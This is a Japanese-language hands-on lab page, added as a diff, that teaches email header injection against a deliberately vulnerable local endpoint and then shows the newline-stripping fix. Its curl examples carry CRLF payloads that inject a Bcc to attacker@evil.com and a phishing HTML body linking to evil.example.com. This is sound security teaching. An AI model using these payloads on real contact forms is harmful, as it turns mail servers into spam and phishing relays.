@@ -1,0 +1,112 @@
+---
+title: Mail Header Injection — メールヘッダーに改行コードを注入してスパムの踏み台にする - 実際に試す
+sidebar_label: ラボ
+sidebar_position: 2
+---
+
+import { MailHeaderInjectionLab } from '@site/src/components/labs/step02/MailHeaderInjectionLab';
+
+# Mail Header Injection — メールヘッダーに改行コードを注入してスパムの踏み台にする - 実際に試す
+
+## ラボ体験
+
+以下の埋め込みラボUIで、脆弱バージョンと安全バージョンを切り替えて試すことができます。
+
+<MailHeaderInjectionLab />
+
+---
+
+## ハンズオン手順
+
+### Step 1: 脆弱バージョンで攻撃を体験
+
+**ゴール**: 件名フィールドに CRLF を注入し、Bcc ヘッダーが追加されることを確認する
+
+1. 開発サーバーを起動する
+
+   ```bash
+   cd backend && pnpm dev
+   ```
+
+2. 正常なメール送信を試す
+
+   ```bash
+   curl -X POST http://localhost:3000/api/labs/mail-header-injection/vulnerable/send \
+     -H "Content-Type: application/json" \
+     -d '{"from": "user@example.com", "subject": "お問い合わせ", "body": "製品について質問があります"}'
+   ```
+
+   正常なレスポンスが返される。バックエンドのコンソールに出力されるメールログを確認し、ヘッダーが意図通りに構成されていることを確認する。
+
+3. メールヘッダーインジェクションを試す — 件名に CRLF + Bcc を注入
+
+   ```bash
+   curl -X POST http://localhost:3000/api/labs/mail-header-injection/vulnerable/send \
+     -H "Content-Type: application/json" \
+     -d '{
+       "from": "user@example.com",
+       "subject": "お問い合わせ\r\nBcc: attacker@evil.com, victim@example.com",
+       "body": "普通のお問い合わせです"
+     }'
+   ```
+
+4. 結果を確認する
+
+   - レスポンスの `generatedHeaders` を確認し、`Bcc: attacker@evil.com, victim@example.com` が独立したヘッダーとして追加されていることを確認する
+   - バックエンドのコンソールログで、生成されたメールメッセージ全体を確認する
+   - **この結果が意味すること**: 攻撃者が件名に CRLF を注入しただけで、任意のメールアドレスに Bcc でメールのコピーを送信できる状態。実際の SMTP サーバーに接続されていれば、スパムの踏み台として悪用される
+
+5. さらに高度な攻撃を試す — 本文の注入
+
+   ```bash
+   curl -X POST http://localhost:3000/api/labs/mail-header-injection/vulnerable/send \
+     -H "Content-Type: application/json" \
+     -d '{
+       "from": "admin@example.com",
+       "subject": "【緊急】セキュリティ通知\r\nBcc: victim@example.com\r\nContent-Type: text/html\r\n\r\n<h1>アカウントが不正アクセスされました</h1><p><a href=\"https://evil.example.com\">今すぐ確認</a></p>",
+       "body": "この本文は無視される"
+     }'
+   ```
+
+   - ヘッダーだけでなく、メールの本文（ボディ）まで完全に制御されていることを確認する
+   - Content-Type が `text/html` に変更され、フィッシング用の HTML が本文として設定されている
+
+### Step 2: 安全バージョンで防御を確認
+
+**ゴール**: 同じ攻撃が失敗することを確認する
+
+1. 同じペイロードを安全なエンドポイントに送信する
+
+   ```bash
+   curl -X POST http://localhost:3000/api/labs/mail-header-injection/secure/send \
+     -H "Content-Type: application/json" \
+     -d '{
+       "from": "user@example.com",
+       "subject": "お問い合わせ\r\nBcc: attacker@evil.com, victim@example.com",
+       "body": "普通のお問い合わせです"
+     }'
+   ```
+
+2. 結果を確認する
+
+   - `Bcc` ヘッダーが独立したヘッダーとして追加されていない
+   - レスポンスの `sanitizedSubject` を確認し、改行コードが除去されて `お問い合わせBcc: attacker@evil.com, victim@example.com` という1行の文字列になっていることを確認する
+   - バックエンドのコンソールログで、生成されたメールメッセージに不正なヘッダーが含まれていないことを確認する
+
+3. コードの差分を確認する
+
+   - `backend/src/labs/step02-injection/mail-header-injection.ts` の脆弱版と安全版を比較
+   - **どの行が違いを生んでいるか** に注目: `.replace(/[\r\n]/g, '')` による改行コード除去
+
+### 確認ポイント
+
+以下を自分の言葉で説明できれば、このラボは完了です:
+
+- [ ] メールヘッダーインジェクションが発生するための条件は何か（メールの構造と CRLF の役割）
+- [ ] 攻撃者は何を入力し、サーバー内部でどうメールメッセージが構築され、結果として何が起きるか
+- [ ] 根本原因はコード/設計のどこにあるか（なぜ CRLF がヘッダーの境界を操作できるのか）
+- [ ] 安全な実装は「なぜ」この攻撃を無効化するのか（改行コード除去がメール構造をどう保護するか）
+
+---
+
+[← ラボに戻る](./mail-header-injection.mdx)
